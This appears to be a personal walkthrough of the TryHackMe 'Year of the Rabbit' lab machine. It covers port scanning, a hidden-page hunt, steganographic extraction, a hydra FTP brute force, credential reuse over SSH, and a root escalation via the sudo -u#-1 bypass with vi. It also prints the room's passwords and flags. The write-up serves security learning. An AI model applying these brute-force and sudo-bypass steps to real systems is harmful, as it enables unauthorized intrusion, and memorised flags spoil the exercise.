## A. Enumeration

### Nmap

```
┌─[glack@parrot]─[~/Desktop/THM/year of the rabbit]
└──╼ $nmap -sV -sT -A 10.10.9.226

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))

```

no other ports are open

### FTP

1. anonymous login not allowd
2. vsftp vesion is not vulnerable

### HTTP

1. gobuster with small wordlist revealed a `/assets` directory
```
/assets               (Status: 301) [Size: 313] [--> http://10.10.28.251/assets/]
```
![[Pasted image 20230723164546.png]]

2. contents of assets were a rickrolled video and style css
3. Upon reading the style.css, we can find a comment
```
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
```

4.  When visiting the `/sup3r_s3cr3t_fl4g.php` we get a pop up to disable our javascript



![[Pasted image 20230723164728.png]]

5. Quick google search on `how to temporay pause javascript in firefox` returns this
![[Pasted image 20230723165149.png]]

6. Upon clicking the `f12` key to open developer console, and navigating to the `Debugger` console section, we are able to see the contents of the file
![[Pasted image 20230723165317.png]]


7. Another hint we get is the hint i in the video itself, we i continue getting rick rolled and search for any particular in the `RickRolled.mp4`
8. At `1:00` duration of the video there is a robotic voice sating `I'll put you out of misery, your are looking in the wrong place` 
9. This got me thinking about stegnography so i downloaded the video in background while watching remainder of the video
```
─[glack@parrot]─[~/Desktop/THM/year of the rabbit]
└──╼ $wget http://10.10.28.251/assets/RickRolled.mp4 .
```


10. `binwalk` revealed something might be hidden inside the mp4 file, I extracted the files using
```bash
┌─[glack@parrot]─[~/Desktop/THM/year of the rabbit]
└──╼ $binwalk -e RickRolled.mp4
```
11. Got stuck here and used the write up for hint, Rickrolled file was just a rabbit hole,
12. When we intercept the request to ` /sup3r_s3cr3t_fl4g.php` we can see a reference to another hidden directory`http://10.10.28.251/WExYY2Cv-qU/Hot_Babe.png` with a png image in it
![[Pasted image 20230723173525.png]]

13. We extract the png file contents with 
```
┌─[glack@parrot]─[~/Desktop/THM/year of the rabbit/_Hot_Babe.png.extracted]
└──╼ $binwalk -e Hot_Babe.png
```

```
┌─[glack@parrot]─[~/Desktop/THM/year of the rabbit/_Hot_Babe.png.extracted]
└──╼ $ls
36  36.zlib
```

at the end of 36.zlib, we get ftp username and password hint, we use that data to launch a hydra ftp bruteforce attack
ftpusername: ftpuser
ftp password: < wordlist > 

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/year of the rabbit/_Hot_Babe.png.extracted]
└──╼ $hydra -l ftpuser -P ftppass.txt 10.10.28.251 ftp
```

we get a hit:
```
[21][ftp] host: 10.10.28.251   login: ftpuser   password: 5iez1wGXKfPKQ
```

## Shell

1. We login with the above creds and in the ftp we get a file with name:
```
2020 Eli's_Creds.txt
```

2. Contents of Eli's Creds are in encoded format, we will have to decrypt it first
3. With a google search we identified, the contents are in `brainfuck` encoded format, decoded the contets here: https://www.dcode.fr/brainfuck-language
```
User: eli
Password: DSpDiM1wAEwid
```

4. We are able to ssh into target machine with above creds 


## Priv ESC

### Horizontal esc

1. after ssh into the machine we are greeted with a message
```
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```
2. using this as hint that there must be a file name with `s3cr3t` as name
```
eli@year-of-the-rabbit:~$ find / -name *s3cr3t* 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
```

3. In the conents of /usr/games/s3cr3t, we get the password for user `gwendoline`
```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```
4. We can with our user to `gwendoline ` and get the user flag
```
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```


### Vertical Esc



1. `sudo -l` give the below results
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

```

2. Nothing using in SUID bit files as well
3. Used the writeup here, and also updated my notes here

We had to used the mentioned command 
```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

after the `vim` promt is open, all we have to do is press `esc`, followed by `:bash`

and we get the root shell and the flag

```
root@year-of-the-rabbit:/root# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```
